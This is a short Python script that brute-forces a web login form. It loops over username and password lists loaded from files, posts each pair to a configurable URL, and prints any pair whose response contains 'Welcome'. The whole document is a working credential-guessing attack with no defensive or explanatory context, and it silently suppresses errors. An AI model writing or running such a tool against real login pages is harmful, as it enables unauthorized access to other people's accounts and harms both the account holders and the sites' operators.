import requests

# Change this
url = 'https://example.com/login'
username_field = 'username'
password_field = 'password'
submit_field = 'submit'

# Load the usernames and passwords from files
with open('usernames.txt') as f:
    usernames = [line.strip() for line in f.readlines()]

with open('passwords.txt') as f:
    passwords = [line.strip() for line in f.readlines()]

# Try to login with each username and password combination
for username in usernames:
    for password in passwords:
        # Create a new session
        session = requests.Session()

        try:
            # Try to login to the form
            response = session.post(url, data={
                username_field: username,
                password_field: password,
                submit_field: 'Login'
            })

            # If the login was successful, print a message and break out of the loops
            if 'Welcome' in response.text:
                print(f'Successful login: {username} with password: {password}')
                break
        except:
            # If there is an error, continue to try the next combination
            pass
